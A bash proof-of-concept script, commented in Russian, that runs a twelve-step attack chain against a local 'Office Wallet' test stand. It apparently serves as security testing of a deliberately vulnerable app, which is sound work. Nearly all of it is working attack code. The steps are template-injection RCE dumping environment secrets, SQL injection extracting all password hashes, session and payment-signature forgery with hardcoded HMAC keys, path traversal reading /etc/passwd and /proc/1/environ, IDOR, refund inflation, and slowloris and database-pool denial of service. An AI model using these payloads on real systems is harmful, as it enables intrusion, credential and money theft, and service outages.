#!/usr/bin/env bash
# run_all.sh — пошаговый прогон всей цепочки на локальном стенде Office Wallet.
# Запуск из корня репозитория, стенд должен быть поднят: docker compose up -d --build
#
#   sh poc/run_all.sh          # этапы 1-10, данные и доступы
#   sh poc/run_all.sh --dos    # + медленные заголовки и отказ БД (портит сервис на ~45с)
#
set -u

BASE="${BASE:-http://localhost:18081}"
JAR="${JAR:-/tmp/ow_run_all.jar}"
DO_DOS=0
[ "${1:-}" = "--dos" ] && DO_DOS=1

step() { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }
ok()   { printf '\033[32m[+] %s\033[0m\n' "$*"; }
info() { printf '    %s\n' "$*"; }
fail() { printf '\033[31m[-] %s\033[0m\n' "$*"; }

balance() {
  curl -s -b "$JAR" "$BASE/" | grep -o 'who-meta">[^<]*' | sed 's/.*· *//' | tr -d ' ₽'
}

order_status() {
  docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc \
    "SELECT id||' '||status FROM orders WHERE id=$1;" 2>/dev/null
}

step "1. вход под ivanov/workplace1"
rm -f "$JAR"
curl -s -c "$JAR" -b "$JAR" -X POST -d 'login=ivanov&password=workplace1&return=/' \
  -o /dev/null "$BASE/login"
if grep -q ow_session "$JAR" 2>/dev/null; then ok "сессия получена"; else
  fail "не удалось войти, стенд поднят?"; exit 1; fi

step "2. RCE через превью чека"
curl -s -b "$JAR" -X POST -d 'product_id=1' -o /dev/null "$BASE/cart/add"
Q=$(curl -s -b "$JAR" -X POST \
      --data-urlencode 'item_comment={{exec "id"}} {{exec "hostname"}} {{exec "env"}}' \
      "$BASE/checkout/quote" | grep -o 'name="quote_id" value="[0-9]*"' | grep -o '[0-9]*')
LOC=$(curl -s -b "$JAR" -X POST -d "quote_id=$Q" -o /dev/null -w '%{redirect_url}' "$BASE/checkout/confirm")
ORD=${LOC##*/}
if [ -n "$ORD" ] && [ "$ORD" != "$BASE/checkout" ]; then
  ok "заказ #$ORD создан из котировки $Q"
  curl -s -b "$JAR" "$BASE/orders/$ORD/preview?renderer=classic" \
    | grep -E 'uid=|_KEY=|DATABASE_URL=' | sed 's/<[^>]*>//g; s/^ *//' | sed 's/^/    /'
else
  fail "котировку не подтвердили (нужен баланс, товар 45000 коп)"
fi

step "3. SQL-инъекция: выгрузка всех хешей паролей"
HASHES=$(curl -s -b "$JAR" -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=(SELECT string_agg(login||chr(61)||password_hash, chr(10)) FROM users)' \
  --data-urlencode 'memo=x' "$BASE/transfer/new" \
  | tr '\n' ' ' | sed -n 's/.*flash bad">//; s|</div>.*||p' | sed 's/&#34;/"/g; s/&#39;/'"'"'/g')
echo "$HASHES" | tr ' ' '\n' | grep '\$2a\$' | sed 's/^/    /'
echo "$HASHES" | grep -q '\$2a\$' && ok "хеши получены без авторизации" || fail "инъекция не отработала"

step "4. подделка админ-сессии (ключи из статики)"
SIG=$(printf '6:admin' | openssl dgst -sha256 -hmac 'office-wallet-session-key' -hex | sed 's/.*= //')
COOKIE="ow_session=ow.6.admin.$SIG"
CODE=$(curl -s -H "Cookie: $COOKIE" -o /tmp/oa.html -w '%{http_code}' "$BASE/admin/secrets")
if [ "$CODE" = "200" ] && grep -q 'Админ Кошелька' /tmp/oa.html; then
  ok "cookie ow.6.admin.<hmac> даёт админку"
else fail "админка не открылась, код $CODE"; fi
curl -s -H "Cookie: $COOKIE" "$BASE/gateway/sms" | grep -o 'код подтверждения сброса [0-9]*' | head -3 | sed 's/^/    /'

step "5. подпись платёжного replay и повтор платежа"
B1=$(balance)
PSIG=$(printf '2:300:3' | openssl dgst -sha256 -hmac 'office-wallet-pay-key' -hex | sed 's/.*= //')
curl -s -b "$JAR" -X POST -d "op_id=2&amount_kop=300&recipient=3&sig=$PSIG" \
  -o /dev/null "$BASE/pay/replay"
B2=$(balance)
if [ "$B1" != "$B2" ]; then ok "платёж проведён повторно: баланс $B1 -> $B2"; else
  info "баланс не изменился ($B1), подпись не сошлась"; fi

step "6. path traversal: чтение файлов контейнера"
curl -s -b "$JAR" -X POST --data-urlencode 'filename=../../../../etc/passwd' \
  "$BASE/statements/export" | head -3 | sed 's/^/    /'
echo "    --- ключи из окружения процесса ---"
curl -s -b "$JAR" -X POST --data-urlencode 'filename=../../../../proc/1/environ' \
  "$BASE/statements/export" | tr '\0' '\n' | grep -E 'KEY|DATABASE_URL' | sed 's/^/    /'

step "7. IDOR: чужой заказ"
if docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc \
     "SELECT id FROM orders WHERE user_id<>1 ORDER BY id LIMIT 1;" 2>/dev/null | grep -q .; then
  FOR=$(docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc \
        "SELECT id FROM orders WHERE user_id<>1 ORDER BY id LIMIT 1;")
  info "чужой заказ #$FOR"
  curl -s -b "$JAR" "$BASE/orders/$FOR" | grep -o "Заказ #$FOR" | sed 's/^/    просмотр: /'
  curl -s -b "$JAR" -X POST "$BASE/orders/$FOR/cancel" -o /dev/null -w '    отмена: HTTP %{http_code}\n'
  order_status "$FOR" | sed 's/^/    статус в базе: /'
else
  info "чужих заказов не осталось"
fi

step "8. завышенный возврат: деньги из ничего"
OWN=$(docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc \
      "SELECT id FROM orders WHERE user_id=1 AND status IN ('paid','delivered','received') ORDER BY id DESC LIMIT 1;")
if [ -n "$OWN" ]; then
  R1=$(balance)
  curl -s -b "$JAR" -X POST -d 'qty=100' -o /dev/null "$BASE/orders/$OWN/return"
  R2=$(balance)
  ok "заказ #$OWN, qty=100: баланс $R1 -> $R2"
else
  info "нет заказа в статусе paid/delivered, создай его через магазин"
fi

step "9. утечка почты: ссылка сброса чужого пароля"
curl -s -X POST -d 'login=adminw' -o /dev/null "$BASE/password/forgot"
LINK=$(curl -s -b "$JAR" "$BASE/mail" | grep -o '/password/reset?rid=[0-9]*' | head -1)
if [ -n "$LINK" ]; then ok "ссылка на сброс пароля админа видна иванову: $LINK"; else
  info "ссылка не найдена (Mailpit ещё не отдал письмо?)"; fi

step "10. прямой доступ к базе по паролю из репозитория"
docker run --rm --network office-wallet-main_default -e PGPASSWORD=wallet \
  postgres:16-alpine psql -h db -U wallet -d wallet -tA \
  -c "SELECT login||' | '||role||' | '||left(password_hash,20)||'...' FROM users ORDER BY id;" \
  2>/dev/null | sed 's/^/    /'

if [ "$DO_DOS" = "1" ]; then
  step "11. медленные заголовки: держим соединения (30с, 300 шт)"
  python3 - "$BASE" 30 300 <<'PY'
import socket, sys, time, urllib.request
base, hold, n = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
host, port = base.split("//", 1)[1].split(":"); port = int(port)
ss = []
for i in range(n):
    s = socket.socket(); s.settimeout(5)
    try:
        s.connect((host, port))
        s.sendall(("GET /login HTTP/1.1\r\nHost: %s\r\n" % host).encode() + ("X-%d: a" % i).encode())
        ss.append(s)
    except OSError:
        break
print("    открыто и удерживается: %d" % len(ss))
end = time.time() + hold
while time.time() < end:
    for s in ss:
        try: s.sendall(b" ")
        except OSError: pass
    time.sleep(3)
print("    после %d с сервер закрыл: ждать нечего, таймаута заголовков нет" % hold)
for s in ss: s.close()
PY

  step "12. отказ БД: неограниченный пул (длится ~45 секунд)"
  python3 - "$BASE" <<'PY'
import http.cookiejar, sys, threading, time, urllib.parse, urllib.request
base = sys.argv[1]
jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
op.open(urllib.request.Request(base + "/login", data=urllib.parse.urlencode(
    {"login": "ivanov", "password": "workplace1", "return": "/"}).encode()), timeout=10)
sess = next(c.value for c in jar if c.name == "ow_session")
res = {}
def hit(i):
    req = urllib.request.Request(base + "/transfer/new", data=urllib.parse.urlencode({
        "recipient": "petrova", "amount_rub": "1;SELECT pg_sleep(45);--", "memo": str(i)}).encode(),
        headers={"Cookie": "ow_session=" + sess})
    try:
        with urllib.request.urlopen(req, timeout=75) as r: res[i] = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        res[i] = "500 too many clients" if "too many clients" in body else e.code
    except Exception as e: res[i] = str(e)
ts = [threading.Thread(target=hit, args=(i,)) for i in range(150)]
for t in ts: t.start()
time.sleep(6)
try:
    with urllib.request.urlopen(base + "/login", timeout=10) as r:
        b = r.read().decode("utf-8", "replace")
        print("    обычный вход во время атаки: HTTP %d%s" % (
            r.status, " (pq: sorry, too many clients already)" if "too many clients" in b else ""))
except Exception as e:
    print("    обычный вход сломался:", e)
for t in ts: t.join(75)
bad = sum(1 for v in res.values() if v != 200)
tm = sum(1 for v in res.values() if "too many" in str(v))
print("    ответов %d, отказов %d, из них 'too many clients': %d" % (len(res), bad, tm))
print("    БД отдохнет сама через ~45 с, вход восстановится")
PY
fi

printf '\n\033[1mГотово.\033[0m Описание каждого шага — в SECURITY.md\n'
printf 'Сброс стенда: docker compose down -v && docker compose up -d --build\n'
